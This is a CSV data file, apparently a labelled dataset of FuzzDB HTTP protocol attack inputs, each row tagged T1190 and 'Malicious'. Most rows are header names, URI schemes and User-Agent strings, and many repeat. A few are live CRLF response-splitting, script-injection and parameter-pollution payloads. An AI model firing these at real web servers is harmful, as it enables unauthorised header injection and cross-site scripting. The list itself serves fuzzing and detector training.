User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20050923 CentOS/1.0.7-1.4.1.centos4 Firefox/1.0.7,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.7) Gecko/20070606,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.14) Gecko/20080520 Firefox/2.0.0.14,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Opera/9.27 (Windows NT 5.1; U; en),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Wget/1.8.2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
VERSION-CONTROL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Vary,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Via,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
WWW-Authenticate,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Warning,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-ATT-DeviceId,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Content-Security-Policy,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Content-Type-Options,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-For,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Host,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Proto,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Frame-Options,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Http-Method-Override,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-MS-ENUMATTS,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Powered-By,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Requested-With,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-UA-Compatible,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Wap-Profile,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-WebKit-CSP,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-XSS-Protection,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
\\r\\n,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aaa:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aaas:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
about:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
acap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
adiumxtra:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
afp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aim:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
apt:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aw:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
beshare:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
bitcoin:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
bolo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
callto:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
chrome:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
coap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
content:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
crid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cvs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
data:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dav:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dict:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dns:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
doi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ed2k:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
facetime:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
fax:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
feed:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
file:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
finger:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
fish:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
geo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gg:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
git:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gizmoproject:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
go:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gopher:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gtalk:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
h323:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
http:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
https:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iax:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
icap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
im:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
imap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
info:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ipp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
irc6:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
irc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ircs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.beep:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.lws:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.xpc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.xpcs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
itms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
jar:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
javascript:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
keyparc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
lastfm:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ldap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ldaps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
lsid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
magnet:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mailto:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
maps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
market:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
message:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
modem:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msnim:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msrp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msrps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mtqp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mumble:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mupdate:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mvn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
news:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
nfs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
nntp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
notes:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
opaquelocktoken:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
palm:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
paparazzi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
platform:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
pop:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
pres:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
prospero:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
proxy:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
psyc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
query:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rmi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rsync:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rtmp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rtsp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
secondlife:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
service:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sgn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
shttp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sieve:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sip:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sips:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
skype:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
smb:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
snmp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soap.beep:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soap.beeps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soldat:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
spotify:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ssh:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
steam:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
svn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tag:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
teamspeak:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tel:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
telnet:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
things:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
thismessage:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tip:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tv:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
udp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
unreal:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
urn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ut2004:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
uuid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
vemmi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ventrilo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
view-source:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wais:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
webcal:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ws:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wss:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wtai:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wyciwyg:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xfire:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmlrpc.beeps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmlrpc.beep :,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmpp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xri:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ymsgr:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
z39.50r:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
z39.50s:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-MD5,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=%23?id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-For,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id&=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
urn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
psyc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
magnet:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
unreal:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; (R1 1.6)),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
facetime:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[&id=2]=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20050923 CentOS/1.0.7-1.4.1.centos4 Firefox/1.0.7,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[=/:@&=+$&id=2]=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-XSS-Protection,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-UA-Compatible,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Refresh,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
acap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aim:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Requested-With,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-ATT-DeviceId,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Wap-Profile,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Content-Type-Options,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BMOVE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
news:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
jar:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
RPC_IN_DATA,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKCOL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmlrpc.beep :,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Charset,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
SUBSCRIBE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.xpc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Content-Security-Policy,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CHECKIN,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Authorization,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Unmodified-Since,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
modem:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Location,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BPROPFIND,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xfire:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aaas:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Origin,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tag:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
go:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ws:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tv:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&#38;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Expires,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msrps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
maps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
lastfm:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/1.22 (compatible; MSIE 2.0d; Windows NT),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
;id=1?id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ARBITRARY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Age,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
snmp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (PLAYSTATION 3; 1.00),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CONNECT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Referer,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sips:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gopher:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Opera/9.27 (Windows NT 5.1; U; en),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
OPTIONS,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
shttp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
